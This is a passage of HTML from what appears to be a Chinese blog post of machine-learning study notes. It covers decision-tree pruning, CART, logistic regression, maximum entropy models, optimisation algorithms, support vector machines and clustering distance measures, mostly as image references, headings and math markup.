src="/posts/498ab7d9/5.5.25.png" class="" title="悲观错误剪枝"><p>例子：</p><img src="/posts/498ab7d9/5.3.1.png" class="" title="悲观错误剪枝"><img src="/posts/498ab7d9/5.3.2.png" class="" title="悲观错误剪枝"><img src="/posts/498ab7d9/5.3.2.png" class="" title="悲观错误剪枝"><p>悲观错误剪枝的特点：</p><ul><li>不需要分离剪枝数据集，有利于实例较少的问题</li><li>误差使用了连续修正值，使得适用性更强</li><li>由于自上而下的剪枝策略，PEP效率更高</li><li>可能会修剪不应剪掉的枝条</li></ul><h4 id="5-5-2-3-最小误差剪枝-MEP"><a href="#5-5-2-3-最小误差剪枝-MEP" class="headerlink" title="5.5.2.3 最小误差剪枝(MEP)"></a>5.5.2.3 最小误差剪枝(MEP)</h4><p>原理：根据剪枝前后的最小分类错误概率来决定是否剪枝。自下而上剪枝，只需要训练集即可。</p><img src="/posts/498ab7d9/5.3.4.png" class="" title="最小误差剪枝"><p>在实际操作中，m是选出来，而不是指定的。</p><img src="/posts/498ab7d9/5.3.5.png" class="" title="最小误差剪枝"><p>例子：</p><img src="/posts/498ab7d9/5.3.6.png" class="" title="最小误差剪枝"><h4 id="5-5-2-4-基于错误剪枝-EBP"><a href="#5-5-2-4-基于错误剪枝-EBP" class="headerlink" title="5.5.2.4 基于错误剪枝(EBP)"></a>5.5.2.4 基于错误剪枝(EBP)</h4><p>原理：根据剪枝前后的误判个数来决定是否剪枝。自下而上剪枝，只需要训练集即可。</p><img src="/posts/498ab7d9/5.3.7.png" class="" title="基于错误剪枝"><img src="/posts/498ab7d9/5.3.8.png" class="" title="基于错误剪枝"><img src="/posts/498ab7d9/5.3.9.png" class="" title="基于错误剪枝"><p>例子：</p><img src="/posts/498ab7d9/5.3.10.png" class="" title="基于错误剪枝"><h4 id="5-5-2-5-代价-复杂度剪枝-CCP"><a href="#5-5-2-5-代价-复杂度剪枝-CCP" class="headerlink" title="5.5.2.5 代价-复杂度剪枝(CCP)"></a>5.5.2.5 代价-复杂度剪枝(CCP)</h4><p>原理：根据剪枝前后的损失函数来决定是否剪枝。</p><img src="/posts/498ab7d9/5.3.11.png" class="" title="代价-复杂度剪枝"><img src="/posts/498ab7d9/5.3.12.png" class="" title="代价-复杂度剪枝"><h2 id="5-6-CART算法"><a href="#5-6-CART算法" class="headerlink" title="5.6 CART算法"></a>5.6 CART算法</h2><p>CART算法是二叉决策树。</p><h3 id="5-6-1-树的生成"><a href="#5-6-1-树的生成" class="headerlink" title="5.6.1 树的生成"></a>5.6.1 树的生成</h3><h4 id="5-6-1-1-分类树"><a href="#5-6-1-1-分类树" class="headerlink" title="5.6.1.1 分类树"></a>5.6.1.1 分类树</h4><img src="/posts/498ab7d9/5.6.1.png" class="" title="基尼指数"><p>将甜度特征作为分类：</p><img src="/posts/498ab7d9/5.6.2.png" class="" title="基尼指数例子"><p>将硬度特征作为分类：</p><img src="/posts/498ab7d9/5.6.3.png" class="" title="基尼指数例子"><p>0.48 &gt; 0.17，甜度特征更有利于桃子的分类，因为它的基尼指数更小，分得更彻底。</p><p><strong>CART分类决策树算法</strong>：</p><img src="/posts/498ab7d9/5.6.4.png" class="" title="CART算法"><p>例子：</p><img src="/posts/498ab7d9/5.6.5.png" class="" title="CART算法例子"><img src="/posts/498ab7d9/5.6.6.png" class="" title="CART算法例子"><img src="/posts/498ab7d9/5.6.7.png" class="" title="CART算法例子"><img src="/posts/498ab7d9/5.6.8.png" class="" title="CART算法例子"><p>对比这四个特征的基尼指数，发现第三个特征的基尼指数最小，所以用它作为根结点来进行划分。再来看其它三个特征，重复上述步骤。</p><img src="/posts/498ab7d9/5.6.9.png" class="" title="CART算法例子"><h4 id="5-6-1-2-回归树"><a href="#5-6-1-2-回归树" class="headerlink" title="5.6.1.2 回归树"></a>5.6.1.2 回归树</h4><img src="/posts/498ab7d9/5.6.10.png" class="" title="回归树模型"><img src="/posts/498ab7d9/5.6.11.png" class="" title="回归树模型"><p><strong>回归树算法</strong>：</p><img src="/posts/498ab7d9/5.6.12.png" class="" title="回归树算法步骤"><h3 id="5-6-2-树的剪枝"><a href="#5-6-2-树的剪枝" class="headerlink" title="5.6.2 树的剪枝"></a>5.6.2 树的剪枝</h3><img src="/posts/498ab7d9/5.6.13.png" class="" title="回归树树的剪枝"><img src="/posts/498ab7d9/5.6.14.png" class="" title="回归树树的剪枝"><h1 id="6-逻辑回归"><a href="#6-逻辑回归" class="headerlink" title="6. 逻辑回归"></a>6. 逻辑回归</h1><img src="/posts/498ab7d9/6.1.1.jpg" class="" title="逻辑回归"><img src="/posts/498ab7d9/6.1.2.jpg" class="" title="逻辑回归"><img src="/posts/498ab7d9/6.1.3.png" class="" title="二项逻辑回归模型"><img src="/posts/498ab7d9/6.1.4.png" class="" title="二项逻辑回归模型"><img src="/posts/498ab7d9/6.1.5.png" class="" title="二项逻辑回归模型"><img src="/posts/498ab7d9/6.1.6.png" class="" title="最大似然估计"><img src="/posts/498ab7d9/6.1.7.png" class="" title="最大似然估计"><h1 id="7-最大熵模型"><a href="#7-最大熵模型" class="headerlink" title="7. 最大熵模型"></a>7. 最大熵模型</h1><h2 id="7-1-最大熵原理"><a href="#7-1-最大熵原理" class="headerlink" title="7.1 最大熵原理"></a>7.1 最大熵原理</h2><h3 id="7-1-1-离散分布"><a href="#7-1-1-离散分布" class="headerlink" title="7.1.1 离散分布"></a>7.1.1 离散分布</h3><img src="/posts/498ab7d9/7.1.1.png" class="" title="离散分布"><img src="/posts/498ab7d9/7.1.2.png" class="" title="离散分布"><img src="/posts/498ab7d9/7.1.3.png" class="" title="离散分布"><img src="/posts/498ab7d9/7.1.4.png" class="" title="离散分布"><h3 id="7-1-2-连续分布"><a href="#7-1-2-连续分布" class="headerlink" title="7.1.2 连续分布"></a>7.1.2 连续分布</h3><p>在连续变量的情况下，最大熵是正态分布。证明如下：</p><img src="/posts/498ab7d9/7.1.4.png" class="" title="连续分布"><h2 id="7-2-最大熵模型"><a href="#7-2-最大熵模型" class="headerlink" title="7.2 最大熵模型"></a>7.2 最大熵模型</h2><img src="/posts/498ab7d9/7.2.1.png" class="" title="最大熵模型"><img src="/posts/498ab7d9/7.2.2.png" class="" title="特征函数"><img src="/posts/498ab7d9/7.2.3.png" class="" title="最大熵模型的例子"><p>经验分布相当于上帝视角的估计值。</p><img src="/posts/498ab7d9/7.2.4.png" class="" title="经验分布"><img src="/posts/498ab7d9/7.2.5.png" class="" title="条件熵"><h2 id="7-3-寻找最大条件熵"><a href="#7-3-寻找最大条件熵" class="headerlink" title="7.3 寻找最大条件熵"></a>7.3 寻找最大条件熵</h2><p>拉格朗日乘子法：</p><img src="/posts/498ab7d9/7.3.1.png" class="" title="寻找最大条件熵"><img src="/posts/498ab7d9/7.3.2.png" class="" title="寻找最大条件熵"><p>原始问题：</p><img src="/posts/498ab7d9/7.4.1.png" class="" title="原始问题"><p>对偶问题：</p><img src="/posts/498ab7d9/7.3.3.png" class="" title="对偶问题"><p>原始问题和对偶问题的最优解：</p><img src="/posts/498ab7d9/7.3.4.png" class="" title="原始问题和对偶问题"><img src="/posts/498ab7d9/7.3.5.png" class="" title="原始问题和对偶问题"><img src="/posts/498ab7d9/7.3.6.png" class="" title="原始问题和对偶问题"><h2 id="7-4-最大熵模型的学习"><a href="#7-4-最大熵模型的学习" class="headerlink" title="7.4 最大熵模型的学习"></a>7.4 最大熵模型的学习</h2><img src="/posts/498ab7d9/7.4.2.png" class="" title="最大熵模型的学习"><img src="/posts/498ab7d9/7.4.3.png" class="" title="最大熵模型的学习"><img src="/posts/498ab7d9/7.4.4.png" class="" title="最大熵模型的学习"><p>原始问题和对偶问题的最优解相同吗？</p><img src="/posts/498ab7d9/7.4.5.png" class="" title="原始问题和对偶问题"><img src="/posts/498ab7d9/7.4.6.png" class="" title="原始问题和对偶问题"><p>证明熵函数H(P)是严格凹函数(上凸函数)：</p><img src="/posts/498ab7d9/7.4.7.png" class="" title="证明"><img src="/posts/498ab7d9/7.4.8.png" class="" title="证明"><p>利用对偶问题解决原始问题：</p><img src="/posts/498ab7d9/7.4.9.png" class="" title="对偶问题解决原始问题"><img src="/posts/498ab7d9/7.4.10.png" class="" title="对偶问题解决原始问题"><img src="/posts/498ab7d9/7.4.11.png" class="" title="对偶问题解决原始问题"><img src="/posts/498ab7d9/7.4.12.png" class="" title="对偶问题解决原始问题"><img src="/posts/498ab7d9/7.4.13.png" class="" title="对偶问题解决原始问题"><p>例子：</p><img src="/posts/498ab7d9/7.4.14.png" class="" title="例子"><img src="/posts/498ab7d9/7.4.15.png" class="" title="例子"><img src="/posts/498ab7d9/7.4.16.png" class="" title="例子"><img src="/posts/498ab7d9/7.4.17.png" class="" title="例子"><h2 id="7-5-极大似然估计"><a href="#7-5-极大似然估计" class="headerlink" title="7.5 极大似然估计"></a>7.5 极大似然估计</h2><img src="/posts/498ab7d9/7.5.1.png" class="" title="极大似然估计"><img src="/posts/498ab7d9/7.5.2.png" class="" title="极大似然估计"><img src="/posts/498ab7d9/7.5.3.png" class="" title="极大似然估计"><img src="/posts/498ab7d9/7.5.4.png" class="" title="极大似然估计"><h2 id="7-6-优化算法"><a href="#7-6-优化算法" class="headerlink" title="7.6 优化算法"></a>7.6 优化算法</h2><h3 id="7-6-1-最速梯度下降法"><a href="#7-6-1-最速梯度下降法" class="headerlink" title="7.6.1 最速梯度下降法"></a>7.6.1 最速梯度下降法</h3><img src="/posts/498ab7d9/7.6.1.png" class="" title="最速梯度下降法"><img src="/posts/498ab7d9/7.6.2.png" class="" title="最速梯度下降法"><img src="/posts/498ab7d9/7.6.3.png" class="" title="最速梯度下降法"><img src="/posts/498ab7d9/7.6.4.png" class="" title="最速梯度下降法"><img src="/posts/498ab7d9/7.6.5.png" class="" title="最速梯度下降法"><h3 id="7-6-2-牛顿法"><a href="#7-6-2-牛顿法" class="headerlink" title="7.6.2 牛顿法"></a>7.6.2 牛顿法</h3><h4 id="7-6-2-1-求零点"><a href="#7-6-2-1-求零点" class="headerlink" title="7.6.2.1 求零点"></a>7.6.2.1 求零点</h4><img src="/posts/498ab7d9/7.6.6.png" class="" title="牛顿法求零点"><img src="/posts/498ab7d9/7.6.7.png" class="" title="牛顿法求零点"><img src="/posts/498ab7d9/7.6.8.png" class="" title="牛顿法求零点"><img src="/posts/498ab7d9/7.6.9.png" class="" title="牛顿法求零点"><img src="/posts/498ab7d9/7.6.10.png" class="" title="牛顿法求零点"><img src="/posts/498ab7d9/7.6.11.png" class="" title="牛顿法求零点"><img src="/posts/498ab7d9/7.6.12.png" class="" title="牛顿法求零点"><img src="/posts/498ab7d9/7.6.13.png" class="" title="牛顿法求零点"><img src="/posts/498ab7d9/7.6.14.png" class="" title="牛顿法求零点"><img src="/posts/498ab7d9/7.6.15.png" class="" title="牛顿法求零点"><img src="/posts/498ab7d9/7.6.16.png" class="" title="牛顿法求零点"><h4 id="7-6-2-1-求极小值"><a href="#7-6-2-1-求极小值" class="headerlink" title="7.6.2.1 求极小值"></a>7.6.2.1 求极小值</h4><img src="/posts/498ab7d9/7.6.17.png" class="" title="牛顿法求极小值"><img src="/posts/498ab7d9/7.6.18.png" class="" title="牛顿法求极小值"><img src="/posts/498ab7d9/7.6.19.png" class="" title="牛顿法求极小值"><p>例子：</p><img src="/posts/498ab7d9/7.6.20.png" class="" title="牛顿法求极小值例子"><p>推广到求多元的情况下：</p><img src="/posts/498ab7d9/7.6.21.png" class="" title="牛顿法求极小值例子"><img src="/posts/498ab7d9/7.6.22.png" class="" title="牛顿法求极小值例子"><img src="/posts/498ab7d9/7.6.23.png" class="" title="牛顿法求极小值例子"><img src="/posts/498ab7d9/7.6.24.png" class="" title="牛顿法求极小值例子"><h3 id="7-6-3-拟牛顿法"><a href="#7-6-3-拟牛顿法" class="headerlink" title="7.6.3 拟牛顿法"></a>7.6.3 拟牛顿法</h3><h4 id="7-6-3-1-条件"><a href="#7-6-3-1-条件" class="headerlink" title="7.6.3.1 条件"></a>7.6.3.1 条件</h4><img src="/posts/498ab7d9/7.7.1.png" class="" title="拟牛顿法条件"><h4 id="7-6-3-2-一维搜索"><a href="#7-6-3-2-一维搜索" class="headerlink" title="7.6.3.2 一维搜索"></a>7.6.3.2 一维搜索</h4><img src="/posts/498ab7d9/7.7.2.png" class="" title="一维搜索"><h4 id="7-6-3-3-DFP算法"><a href="#7-6-3-3-DFP算法" class="headerlink" title="7.6.3.3 DFP算法"></a>7.6.3.3 DFP算法</h4><img src="/posts/498ab7d9/7.7.3.png" class="" title="DFP算法"><img src="/posts/498ab7d9/7.7.4.png" class="" title="DFP算法"><p>DFP应用于最大熵模型：</p><img src="/posts/498ab7d9/7.7.8.png" class="" title="DFP算法应用于最大熵模型"><h4 id="7-6-3-4-BFGS算法"><a href="#7-6-3-4-BFGS算法" class="headerlink" title="7.6.3.4 BFGS算法"></a>7.6.3.4 BFGS算法</h4><img src="/posts/498ab7d9/7.7.5.png" class="" title="BFGS算法"><img src="/posts/498ab7d9/7.7.6.png" class="" title="BFGS算法"><p>BFGS应用于最大熵模型：</p><img src="/posts/498ab7d9/7.7.9.png" class="" title="BFGS应用于最大熵模型"><h4 id="7-6-3-5-Broyden算法"><a href="#7-6-3-5-Broyden算法" class="headerlink" title="7.6.3.5 Broyden算法"></a>7.6.3.5 Broyden算法</h4><img src="/posts/498ab7d9/7.7.7.png" class="" title="Broyden算法"><h3 id="7-6-4-迭代尺度法"><a href="#7-6-4-迭代尺度法" class="headerlink" title="7.6.4 迭代尺度法"></a>7.6.4 迭代尺度法</h3><img src="/posts/498ab7d9/7.7.10.png" class="" title="迭代尺度法"><img src="/posts/498ab7d9/7.7.11.png" class="" title="迭代尺度法"><img src="/posts/498ab7d9/7.7.12.png" class="" title="迭代尺度法"><img src="/posts/498ab7d9/7.7.13.png" class="" title="迭代尺度法"><img src="/posts/498ab7d9/7.7.14.png" class="" title="迭代尺度法"><img src="/posts/498ab7d9/7.7.15.png" class="" title="迭代尺度法"><img src="/posts/498ab7d9/7.7.16.png" class="" title="迭代尺度法"><img src="/posts/498ab7d9/7.7.17.png" class="" title="迭代尺度法"><img src="/posts/498ab7d9/7.7.18.png" class="" title="迭代尺度法"><h1 id="8-支持向量机"><a href="#8-支持向量机" class="headerlink" title="8. 支持向量机"></a>8. 支持向量机</h1><img src="/posts/498ab7d9/8.1.1.png" class="" title="分类决策"><img src="/posts/498ab7d9/8.1.2.png" class="" title="逻辑回归与感知机"><img src="/posts/498ab7d9/8.1.3.png" class="" title="支持向量机"><h2 id="8-1-线性可分支持向量机"><a href="#8-1-线性可分支持向量机" class="headerlink" title="8.1 线性可分支持向量机"></a>8.1 线性可分支持向量机</h2><h3 id="8-1-1-原始算法"><a href="#8-1-1-原始算法" class="headerlink" title="8.1.1 原始算法"></a>8.1.1 原始算法</h3><img src="/posts/498ab7d9/8.1.4.png" class="" title="几何间隔"><img src="/posts/498ab7d9/8.1.5.png" class="" title="几何间隔"><img src="/posts/498ab7d9/8.1.6.png" class="" title="函数间隔"><img src="/posts/498ab7d9/8.1.7.png" class="" title="函数间隔"><img src="/posts/498ab7d9/8.1.8.png" class="" title="函数间隔"><img src="/posts/498ab7d9/8.1.9.png" class="" title="凸优化问题"><img src="/posts/498ab7d9/8.1.10.png" class="" title="凸优化问题"><img src="/posts/498ab7d9/8.1.12.png" class="" title="证明唯一性"> <img src="/posts/498ab7d9/8.1.11.png" class="" title="证明唯一性"> <img src="/posts/498ab7d9/8.1.13.png" class="" title="最大间隔算法"> <img src="/posts/498ab7d9/8.1.14.png" class="" title="最大间隔算法的例子"> <h3 id="8-1-2-对偶算法"><a href="#8-1-2-对偶算法" class="headerlink" title="8.1.2 对偶算法"></a>8.1.2 对偶算法</h3><img src="/posts/498ab7d9/8.1.15.png" class="" title="对偶问题"> <img src="/posts/498ab7d9/8.1.16.png" class="" title="对偶问题"> <img src="/posts/498ab7d9/8.1.17.png" class="" title="对偶问题"> <img src="/posts/498ab7d9/8.1.18.png" class="" title="对偶问题"> <img src="/posts/498ab7d9/8.1.19.png" class="" title="对偶算法"> <img src="/posts/498ab7d9/8.1.20.png" class="" title="对偶算法的例子"> <img src="/posts/498ab7d9/8.2.1.png" class="" title="对偶算法的例子"> <img src="/posts/498ab7d9/8.2.2.png" class="" title="对偶算法的例子"> <h2 id="8-2-线性不可分支持向量机"><a href="#8-2-线性不可分支持向量机" class="headerlink" title="8.2 线性不可分支持向量机"></a>8.2 线性不可分支持向量机</h2><h3 id="8-2-1-原始算法"><a href="#8-2-1-原始算法" class="headerlink" title="8.2.1 原始算法"></a>8.2.1 原始算法</h3><img src="/posts/498ab7d9/8.3.1.png" class="" title="线性支持向量机的原始算法"> <img src="/posts/498ab7d9/8.3.2.png" class="" title="线性支持向量机的原始算法"> <h3 id="8-2-2-对偶算法"><a href="#8-2-2-对偶算法" class="headerlink" title="8.2.2 对偶算法"></a>8.2.2 对偶算法</h3><img src="/posts/498ab7d9/8.4.1.png" class="" title="线性支持向量机的对偶算法"> <img src="/posts/498ab7d9/8.4.2.png" class="" title="线性支持向量机的对偶算法"> <img src="/posts/498ab7d9/8.4.3.png" class="" title="线性支持向量机的对偶算法"> <img src="/posts/498ab7d9/8.4.4.png" class="" title="线性支持向量机的对偶算法"> <img src="/posts/498ab7d9/8.4.5.png" class="" title="线性支持向量机"> <img src="/posts/498ab7d9/8.4.6.png" class="" title="线性支持向量机"> <h3 id="8-2-3-合页损失"><a href="#8-2-3-合页损失" class="headerlink" title="8.2.3 合页损失"></a>8.2.3 合页损失</h3><img src="/posts/498ab7d9/8.5.1.png" class="" title="合页损失"> <img src="/posts/498ab7d9/8.5.2.png" class="" title="合页损失"> <h2 id="8-3-非线性支持向量机"><a href="#8-3-非线性支持向量机" class="headerlink" title="8.3 非线性支持向量机"></a>8.3 非线性支持向量机</h2><img src="/posts/498ab7d9/8.6.1.png" class="" title="非线性支持向量机"> <h3 id="8-3-1-核函数"><a href="#8-3-1-核函数" class="headerlink" title="8.3.1 核函数"></a>8.3.1 核函数</h3><img src="/posts/498ab7d9/8.3.3.png" class="" title="核函数"> <img src="/posts/498ab7d9/8.3.4.png" class="" title="核函数"><img src="/posts/498ab7d9/8.3.5.png" class="" title="核函数"><img src="/posts/498ab7d9/8.3.6.png" class="" title="核函数"><img src="/posts/498ab7d9/8.3.7.png" class="" title="核函数"><img src="/posts/498ab7d9/8.3.8.png" class="" title="核函数"><img src="/posts/498ab7d9/8.3.9.png" class="" title="核函数"><img src="/posts/498ab7d9/8.3.10.png" class="" title="核函数"><img src="/posts/498ab7d9/8.3.11.png" class="" title="核函数"><img src="/posts/498ab7d9/8.3.12.png" class="" title="核函数"><img src="/posts/498ab7d9/8.3.13.png" class="" title="核函数"><img src="/posts/498ab7d9/8.3.14.png" class="" title="核函数"><img src="/posts/498ab7d9/8.3.15.png" class="" title="核函数"><img src="/posts/498ab7d9/8.3.16.png" class="" title="核函数"><img src="/posts/498ab7d9/8.3.17.png" class="" title="核函数"><h3 id="8-3-2-定义在欧氏空间的正定核函数"><a href="#8-3-2-定义在欧氏空间的正定核函数" class="headerlink" title="8.3.2 定义在欧氏空间的正定核函数"></a>8.3.2 定义在欧氏空间的正定核函数</h3><img src="/posts/498ab7d9/8.3.18.png" class="" title="欧氏空间核函数"><h3 id="8-3-3-定义在离散数据集合的正定核函数"><a href="#8-3-3-定义在离散数据集合的正定核函数" class="headerlink" title="8.3.3 定义在离散数据集合的正定核函数"></a>8.3.3 定义在离散数据集合的正定核函数</h3><img src="/posts/498ab7d9/8.3.19.png" class="" title="离散集合核函数"><img src="/posts/498ab7d9/8.3.20.png" class="" title="字符串核函数"><img src="/posts/498ab7d9/8.3.21.png" class="" title="字符串核函数"><h3 id="8-3-4-非支持向量机的算法"><a href="#8-3-4-非支持向量机的算法" class="headerlink" title="8.3.4 非支持向量机的算法"></a>8.3.4 非支持向量机的算法</h3><img src="/posts/498ab7d9/8.4.7.png" class="" title="支持向量机和非支持向量机的区别"><h4 id="8-3-4-1-坐标下降法"><a href="#8-3-4-1-坐标下降法" class="headerlink" title="8.3.4.1 坐标下降法"></a>8.3.4.1 坐标下降法</h4><img src="/posts/498ab7d9/8.4.8.png" class="" title="坐标下降法"><img src="/posts/498ab7d9/8.4.9.png" class="" title="坐标下降法"><h4 id="8-3-4-2-SMO-序列最小最优-算法"><a href="#8-3-4-2-SMO-序列最小最优-算法" class="headerlink" title="8.3.4.2 SMO(序列最小最优)算法"></a>8.3.4.2 SMO(序列最小最优)算法</h4><img src="/posts/498ab7d9/8.4.10.png" class="" title="SMO算法"><img src="/posts/498ab7d9/8.4.11.png" class="" title="SMO算法"><img src="/posts/498ab7d9/8.4.12.png" class="" title="SMO算法"><img src="/posts/498ab7d9/8.4.13.png" class="" title="SMO算法"><img src="/posts/498ab7d9/8.4.14.png" class="" title="SMO算法"><img src="/posts/498ab7d9/8.4.15.png" class="" title="SMO算法"><img src="/posts/498ab7d9/8.4.16.png" class="" title="SMO算法"><img src="/posts/498ab7d9/8.4.17.png" class="" title="SMO算法"><img src="/posts/498ab7d9/8.4.18.png" class="" title="SMO算法"><img src="/posts/498ab7d9/8.4.19.png" class="" title="SMO算法"><img src="/posts/498ab7d9/8.4.20.png" class="" title="SMO算法"><img src="/posts/498ab7d9/8.4.21.png" class="" title="SMO算法"><img src="/posts/498ab7d9/8.4.22.png" class="" title="SMO算法"><img src="/posts/498ab7d9/8.4.23.png" class="" title="SMO算法"><h1 id="9-聚类方法"><a href="#9-聚类方法" class="headerlink" title="9. 聚类方法"></a>9. 聚类方法</h1><h2 id="9-1-相似度或距离"><a href="#9-1-相似度或距离" class="headerlink" title="9.1 相似度或距离"></a>9.1 相似度或距离</h2><p>聚类的核心概念是相似度（similarity) 或距离（distance)，有多种相似度或距离定义。因为相似度直接影响聚类的结果，所以其选择是聚类的根本问题。</p><h3 id="9-1-1-闵可夫斯基距离"><a href="#9-1-1-闵可夫斯基距离" class="headerlink" title="9.1.1 闵可夫斯基距离"></a>9.1.1 闵可夫斯基距离</h3><p>闵可夫斯基距离：距离越大相似度越小，距离越小相似度越大。</p><p>给定样本集合X，X是m维实数向量空间<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.048ex" xmlns="http://www.w3.org/2000/svg" width="3.31ex" height="1.593ex" role="img" focusable="false" viewBox="0 -683 1462.8 704"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g><g data-mml-node="mi" transform="translate(792,363) scale(0.707)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>中点的集合，其中</p><script type="math/tex; mode=display">x_i,x_j\in X,x_i=(x_{1i},x_{2i},...,x_{mi})^\mathrm T,x_j=(x_{1j},x_{2j},...,x_{mj})^\mathrm T</script><p>样本<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="2.034ex" height="1.357ex" role="img" focusable="false" viewBox="0 -442 899 599.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>与样本<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="2.141ex" height="1.666ex" role="img" focusable="false" viewBox="0 -442 946.3 736.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g></g></svg></mjx-container>的闵可夫斯基距离定义为：</p><script type="math/tex; mode=display">d_{ij}=(\sum_{k=1}^m|x_{ki}-x_{kj}|^p)^\frac1p,其中p\ge1</script><ul><li><p>当p=2时称为欧氏距离</p><script type="math/tex; mode=display">d_{ij}=(\sum_{k=1}^m|x_{ki}-x_{kj}|^2)^\frac12</script></li><li><p>当p=1时称为曼哈顿距离</p><script type="math/tex; mode=display">d_{ij}=\sum_{k=1}^m|x_{ki}-x_{kj}|</script></li><li><p>当p趋近于无穷时称为切比雪夫距离</p><script type="math/tex; mode=display">d_{ij}=\max_k|x_{ki}-x_{kj}|</script></li></ul><h3 id="9-1-2-马哈拉诺比斯距离"><a href="#9-1-2-马哈拉诺比斯距离" class="headerlink" title="9.1.2 马哈拉诺比斯距离"></a>9.1.2 马哈拉诺比斯距离</h3><p>马哈拉诺比斯距离：距离越大相似度越小，距离越小相似度越大。</p><p>给定一个样本集合X，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="12.692ex" height="2.363ex" role="img" focusable="false" viewBox="0 -750 5610.1 